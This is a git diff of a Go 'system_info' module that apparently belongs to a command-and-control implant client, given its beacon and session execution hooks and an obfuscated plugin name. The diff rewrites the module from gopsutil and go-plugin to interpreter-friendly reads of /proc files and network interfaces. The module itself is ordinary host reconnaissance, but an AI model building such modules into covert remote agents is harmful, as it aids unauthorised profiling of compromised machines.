@@ -1,52 +1,13 @@
 package main
 
 import (
-	_ "embed"
-	"encoding/json"
 	"fmt"
-	"io"
 	"net"
 	"os"
 	"runtime"
 	"strings"
 	"time"
-
-	"src/Client/generic/config"
-	Logger "src/Client/generic/logger"
-
-	"github.com/shirou/gopsutil/v3/cpu"
-	"github.com/shirou/gopsutil/v3/disk"
-	"github.com/shirou/gopsutil/v3/host"
-	"github.com/shirou/gopsutil/v3/mem"
-
-	"src/Client/dynamic/shared"
-
-	hclog "github.com/hashicorp/go-hclog"
-	"github.com/hashicorp/go-plugin"
 )
-
-//go:embed obfuscate.json
-var obfuscateJSON []byte
-
-var pluginName string
-
-const pluginKey = "system_info"
-
-func init() {
-	pluginName = pluginKey
-
-	type entry struct {
-		ObfuscatedName string `json:"obfuscation_name"`
-	}
-	var m map[string]entry
-	if err := json.Unmarshal(obfuscateJSON, &m); err == nil {
-		if e, ok := m[pluginKey]; ok {
-			if n := strings.TrimSpace(e.ObfuscatedName); n != "" {
-				pluginName = n
-			}
-		}
-	}
-}
 
 type storageInfo struct {
 	DriveName  string `json:"drive_name"`
@@ -74,88 +35,191 @@ type systemInfo struct {
 	Storage           []storageInfo      `json:"storage"`
 }
 
-// bytesToGB converts bytes to a human-readable string in GB.
-func bytesToGB(b uint64) string {
-	return fmt.Sprintf("%.2f GB", float64(b)/float64(1<<30))
-}
-
-// --- Information Gathering Functions ---
+// --- Information Gathering Functions (Yaegi-compatible) ---
 
 func getOSInfo() (string, string, string, string) {
-	Logger.Log("Gathering OS information...")
-	hostInfo, err := host.Info()
-	Logger.Log("OS information gathered.")
-	if err != nil {
-		Logger.Warn(fmt.Sprintf("Could not get host info: %v", err))
-		return runtime.GOOS, "N/A", runtime.GOARCH, "N/A"
+	osName := runtime.GOOS
+	arch := runtime.GOARCH
+	osVersion := "Unknown"
+	kernelVersion := "N/A"
+
+	switch runtime.GOOS {
+	case "linux":
+		// Try to read /etc/os-release
+		data, err := os.ReadFile("/etc/os-release")
+		if err == nil {
+			lines := strings.Split(string(data), "\n")
+			for _, line := range lines {
+				if strings.HasPrefix(line, "PRETTY_NAME=") {
+					osVersion = strings.Trim(strings.TrimPrefix(line, "PRETTY_NAME="), "\"")
+					break
+				}
+			}
+		}
+		if osVersion == "Unknown" {
+			osVersion = "Linux"
+		}
+
+		// Try to read kernel version from /proc/version
+		data, err = os.ReadFile("/proc/version")
+		if err == nil {
+			parts := strings.Fields(string(data))
+			if len(parts) >= 3 {
+				kernelVersion = parts[2]
+			}
+		}
+
+	case "darwin":
+		osVersion = "macOS"
+		kernelVersion = "Darwin"
+
+	case "windows":
+		osVersion = "Windows"
+		kernelVersion = "N/A"
+
+	default:
+		osVersion = "Unknown"
+		kernelVersion = "Unknown"
 	}
-	Logger.Log(fmt.Sprintf("OS: %s, Version: %s, Arch: %s, Kernel: %s",
-		hostInfo.Platform, hostInfo.PlatformVersion, hostInfo.KernelArch, hostInfo.KernelVersion))
-	return hostInfo.Platform, hostInfo.PlatformVersion, hostInfo.KernelArch, hostInfo.KernelVersion
+
+	return osName, osVersion, arch, kernelVersion
 }
 
 func getHostname() string {
-	Logger.Log("Gathering hostname...")
 	hostname, err := os.Hostname()
-	Logger.Log("Hostname gathered.")
 	if err != nil {
-		Logger.Warn(fmt.Sprintf("Could not get hostname: %v", err))
 		return "N/A"
 	}
-	Logger.Log(fmt.Sprintf("Hostname: %s", hostname))
 	return hostname
 }
 
 func getUptime() string {
-	Logger.Log("Gathering system uptime...")
-	uptime, err := host.Uptime()
-	Logger.Log("Uptime gathered.")
-	if err != nil {
-		Logger.Warn(fmt.Sprintf("Could not get uptime: %v", err))
-		return "N/A"
+	var uptime string
+
+	switch runtime.GOOS {
+	case "linux":
+		data, err := os.ReadFile("/proc/uptime")
+		if err == nil {
+			fields := strings.Fields(string(data))
+			if len(fields) > 0 {
+				var seconds float64
+				fmt.Sscanf(fields[0], "%f", &seconds)
+				d := time.Duration(seconds) * time.Second
+				days := int(d.Hours() / 24)
+				hours := int(d.Hours()) % 24
+				minutes := int(d.Minutes()) % 60
+				uptime = fmt.Sprintf("%dd %dh %dm", days, hours, minutes)
+			}
+		}
+
+	case "darwin":
+		uptime = "N/A (requires sysctl)"
+
+	case "windows":
+		uptime = "N/A (requires systeminfo)"
 	}
-	d := time.Duration(uptime) * time.Second
-	Logger.Log(fmt.Sprintf("Uptime: %s", d.String()))
-	return d.String()
+
+	if uptime == "" {
+		uptime = "N/A"
+	}
+	return uptime
 }
 
 func getCPUInfo() string {
-	Logger.Log("Gathering CPU information...")
-	cpuInfos, err := cpu.Info()
-	if err != nil || len(cpuInfos) == 0 {
-		Logger.Warn(fmt.Sprintf("Could not get CPU info: %v", err))
-		return "N/A"
+	var cpu string
+
+	switch runtime.GOOS {
+	case "linux":
+		data, err := os.ReadFile("/proc/cpuinfo")
+		if err == nil {
+			lines := strings.Split(string(data), "\n")
+			for _, line := range lines {
+				if strings.HasPrefix(line, "model name") {
+					parts := strings.SplitN(line, ":", 2)
+					if len(parts) == 2 {
+						cpu = strings.TrimSpace(parts[1])
+						break
+					}
+				}
+			}
+		}
+
+	case "darwin":
+		cpu = fmt.Sprintf("%s CPU", runtime.GOARCH)
+
+	case "windows":
+		cpu = fmt.Sprintf("%s CPU", runtime.GOARCH)
 	}
-	Logger.Log(fmt.Sprintf("CPU Model: %s, Cores: %d, Frequency: %.2f MHz",
-		cpuInfos[0].ModelName, cpuInfos[0].Cores, cpuInfos[0].Mhz))
-	return cpuInfos[0].ModelName
+
+	if cpu == "" {
+		cpu = fmt.Sprintf("%s (%d cores)", runtime.GOARCH, runtime.NumCPU())
+	}
+	return cpu
 }
 
 func getMemoryInfo() string {
-	Logger.Log("Gathering memory information...")
-	vmStat, err := mem.VirtualMemory()
-	if err != nil {
-		Logger.Warn(fmt.Sprintf("Could not get memory info: %v", err))
-		return "N/A"
+	var memory string
+
+	switch runtime.GOOS {
+	case "linux":
+		data, err := os.ReadFile("/proc/meminfo")
+		if err == nil {
+			lines := strings.Split(string(data), "\n")
+			var total, available, free uint64
+			for _, line := range lines {
+				fields := strings.Fields(line)
+				if len(fields) < 2 {
+					continue
+				}
+				var val uint64
+				fmt.Sscanf(fields[1], "%d", &val)
+
+				if strings.HasPrefix(line, "MemTotal:") {
+					total = val * 1024 // Convert KB to bytes
+				} else if strings.HasPrefix(line, "MemFree:") {
+					free = val * 1024
+				} else if strings.HasPrefix(line, "MemAvailable:") {
+					available = val * 1024
+				}
+			}
+			if total > 0 {
+				totalGB := float64(total) / (1024 * 1024 * 1024)
+				if available > 0 {
+					availGB := float64(available) / (1024 * 1024 * 1024)
+					usedPercent := float64(total-available) / float64(total) * 100
+					memory = fmt.Sprintf("Total: %.2f GB, Available: %.2f GB, Used: %.1f%%",
+						totalGB, availGB, usedPercent)
+				} else {
+					freeGB := float64(free) / (1024 * 1024 * 1024)
+					usedPercent := float64(total-free) / float64(total) * 100
+					memory = fmt.Sprintf("Total: %.2f GB, Free: %.2f GB, Used: %.1f%%",
+						totalGB, freeGB, usedPercent)
+				}
+			}
+		}
+
+	case "darwin":
+		memory = "N/A (requires vm_stat)"
+
+	case "windows":
+		memory = "N/A (requires systeminfo)"
 	}
-	Logger.Log(fmt.Sprintf("Total Memory: %s, Free Memory: %s, Used Percent: %.2f%%",
-		bytesToGB(vmStat.Total), bytesToGB(vmStat.Free), vmStat.UsedPercent))
-	return fmt.Sprintf("Total: %s, Free: %s, Used: %.2f%%",
-		bytesToGB(vmStat.Total), bytesToGB(vmStat.Free), vmStat.UsedPercent)
+
+	if memory == "" {
+		memory = "N/A"
+	}
+	return memory
 }
 
 func getNetworkInfo() []networkInterface {
-	Logger.Log("Gathering network interface information...")
 	interfaces, err := net.Interfaces()
 	if err != nil {
-		Logger.Warn(fmt.Sprintf("Could not get network interfaces: %v", err))
 		return nil
 	}
 
 	var results []networkInterface
 	for _, iface := range interfaces {
-		Logger.Log(fmt.Sprintf("Processing interface: %s", iface.Name))
-		// Ignore loopback and inactive interfaces
+		// Skip loopback and down interfaces
 		if iface.Flags&net.FlagLoopback != 0 || iface.Flags&net.FlagUp == 0 {
 			continue
 		}
@@ -166,7 +230,6 @@ func getNetworkInfo() []networkInterface {
 			continue
 		}
 		for _, addr := range addrs {
-			// Extract IP address from CIDR notation
 			var ip net.IP
 			switch v := addr.(type) {
 			case *net.IPNet:
@@ -178,7 +241,6 @@ func getNetworkInfo() []networkInterface {
 				ips = append(ips, ip.String())
 			}
 		}
-		Logger.Log(fmt.Sprintf("Interface %s has IPs: %v", iface.Name, ips))
 
 		if len(ips) > 0 {
 			results = append(results, networkInterface{
@@ -188,41 +250,23 @@ func getNetworkInfo() []networkInterface {
 			})
 		}
 	}
-	Logger.Log(fmt.Sprintf("Found %d active network interfaces.", len(results)))
 	return results
 }
 
 func getStorageInfo() []storageInfo {
-	Logger.Log("Gathering storage information...")
-	partitions, err := disk.Partitions(true) // true for all partitions
-	if err != nil {
-		Logger.Warn(fmt.Sprintf("Could not get disk partitions: %v", err))
-		return nil
+	// Storage info requires external commands or system calls
+	// Not easily accessible in Yaegi without os/exec
+	return []storageInfo{
+		{
+			DriveName:  "N/A",
+			TotalSpace: "N/A (requires df or wmic)",
+			FreeSpace:  "N/A",
+			UsedSpace:  "N/A",
+		},
 	}
-
-	var results []storageInfo
-	for _, p := range partitions {
-		usage, err := disk.Usage(p.Mountpoint)
-		if err != nil {
-			continue
-		}
-		// Only include physical devices and common filesystems
-		if strings.HasPrefix(p.Device, "/dev/loop") || usage.Total == 0 {
-			continue
-		}
-		results = append(results, storageInfo{
-			DriveName:  p.Mountpoint,
-			TotalSpace: bytesToGB(usage.Total),
-			FreeSpace:  bytesToGB(usage.Free),
-			UsedSpace:  bytesToGB(usage.Used),
-		})
-	}
-	Logger.Log(fmt.Sprintf("Found %d storage devices.", len(results)))
-	return results
 }
 
 func GetSystemInfo() systemInfo {
-	Logger.Log("Gathering complete system information...")
 	osName, osVersion, arch, kernel := getOSInfo()
 
 	info := systemInfo{
@@ -237,79 +281,46 @@ func GetSystemInfo() systemInfo {
 		NetworkInterfaces: getNetworkInfo(),
 		Storage:           getStorageInfo(),
 	}
-	Logger.Log("System information gathered successfully.")
 	return info
 }
 
 func SysInfoString() string {
-	Logger.Log("Generating system information string...")
 	info := GetSystemInfo()
-	// Using Sprintf to format the output. For more complex/structured output,
-	// you might marshal the systemInfo struct to JSON.
-	return fmt.Sprintf(
-		"OS:\t\t%s %s\n"+
-			"Arch:\t\t%s\n"+
-			"Hostname:\t%s\n"+
-			"Kernel:\t\t%s\n"+
-			"Uptime:\t\t%s\n"+
-			"CPU:\t\t%s\n"+
-			"Memory:\t\t%s\n"+
-			"Storage:\n%v\n"+
-			"Network Interfaces:\n%v",
-		info.OsName,
-		info.OsVersion,
-		info.Architecture,
-		info.Hostname,
-		info.KernelVersion,
-		info.UpTime,
-		info.CPU,
-		info.Memory,
-		info.Storage,
-		info.NetworkInterfaces,
-	)
+
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("OS:\t\t%s %s\n", info.OsName, info.OsVersion))
+	sb.WriteString(fmt.Sprintf("Arch:\t\t%s\n", info.Architecture))
+	sb.WriteString(fmt.Sprintf("Hostname:\t%s\n", info.Hostname))
+	sb.WriteString(fmt.Sprintf("Kernel:\t\t%s\n", info.KernelVersion))
+	sb.WriteString(fmt.Sprintf("Uptime:\t\t%s\n", info.UpTime))
+	sb.WriteString(fmt.Sprintf("CPU:\t\t%s\n", info.CPU))
+	sb.WriteString(fmt.Sprintf("Memory:\t\t%s\n", info.Memory))
+
+	if len(info.Storage) > 0 {
+		sb.WriteString("\nStorage:\n")
+		for _, s := range info.Storage {
+			sb.WriteString(fmt.Sprintf("  %s - Total: %s, Used: %s, Free: %s\n",
+				s.DriveName, s.TotalSpace, s.UsedSpace, s.FreeSpace))
+		}
+	}
+
+	if len(info.NetworkInterfaces) > 0 {
+		sb.WriteString("\nNetwork Interfaces:\n")
+		for _, ni := range info.NetworkInterfaces {
+			sb.WriteString(fmt.Sprintf("  %s (%s):\n", ni.Name, ni.MACAddress))
+			for _, ip := range ni.IPAddresses {
+				sb.WriteString(fmt.Sprintf("    %s\n", ip))
+			}
+		}
+	}
+
+	return sb.String()
 }
 
-// --- SysinfoCommand Implementation ---
-
-// SysinfoCommandImpl implements the shared.SysinfoCommand interface.
-type SysinfoCommandImpl struct{}
-
-func (c *SysinfoCommandImpl) Execute(args []string) (string, error) {
-	Logger.Log("SysinfoCommandImpl.Execute called (default context)")
+func Execute(args []string) (string, error) {
 	return SysInfoString(), nil
 }
 
-func (c *SysinfoCommandImpl) ExecuteFromSession(args []string) (string, error) {
-	Logger.Log("SysinfoCommandImpl.ExecuteFromSession called")
-	output := SysInfoString() // Reuse the core info gathering
-	return fmt.Sprintf("--- System Info (Session Context) ---\n%s\n-------------------------------------", output), nil
-}
-
-func (c *SysinfoCommandImpl) ExecuteFromBeacon(args []string, data string) (string, error) {
-	Logger.Log(fmt.Sprintf("SysinfoCommandImpl.ExecuteFromBeacon called with data: %s", data))
-	out, err := c.Execute(args)
-	if err != nil {
-		Logger.Error(fmt.Sprintf("Error executing system info in beacon context: %v", err))
-		return "", err
-	}
-	Logger.Log(fmt.Sprintf("Beacon data received: %s", data))
-	return fmt.Sprintf("--- System Info (Beacon Context) ---\nBeacon Data: %s\n%s\n------------------------------------", data, out), nil
-}
-
-func main() {
-	// Silence plugin logs unless in debug
-	var plog hclog.Logger
-	if config.IsDebug() {
-		plog = hclog.New(&hclog.LoggerOptions{Name: "plugin.system_info", Level: hclog.Debug})
-	} else {
-		plog = hclog.New(&hclog.LoggerOptions{Name: "plugin.system_info", Level: hclog.Off, Output: io.Discard})
-	}
-
-	plugin.Serve(&plugin.ServeConfig{
-		HandshakeConfig: shared.HandshakeConfig,
-		Plugins: map[string]plugin.Plugin{
-			pluginName: &shared.CommandPlugin{Impl: &SysinfoCommandImpl{}},
-		},
-		Logger: plog,
-	})
+func ExecuteFromBeacon(args []string, data string) (string, error) {
+	return SysInfoString(), nil
 }
